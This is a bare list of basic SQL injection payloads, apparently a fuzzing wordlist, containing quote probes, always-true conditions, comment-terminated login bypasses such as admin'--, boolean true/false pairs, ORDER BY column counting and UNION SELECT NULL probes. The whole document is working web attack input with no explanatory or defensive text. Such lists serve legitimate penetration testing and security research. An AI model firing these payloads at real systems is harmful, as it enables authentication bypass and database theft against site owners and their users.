# SQL Injection Basic Payloads
'
"
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
" OR "1"="1
' OR 1=1--
' OR 1=1#
admin'--
') OR ('1'='1
') OR ('1'='1'--
1' AND '1'='1
1' AND '1'='2
' AND 1=1--
' AND 1=2--
' OR ''='
' OR 'x'='x
'; --
'; #
'/*
1' ORDER BY 1--
1' ORDER BY 2--
1' ORDER BY 3--
1' ORDER BY 10--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' GROUP BY 1--
' HAVING 1=1--
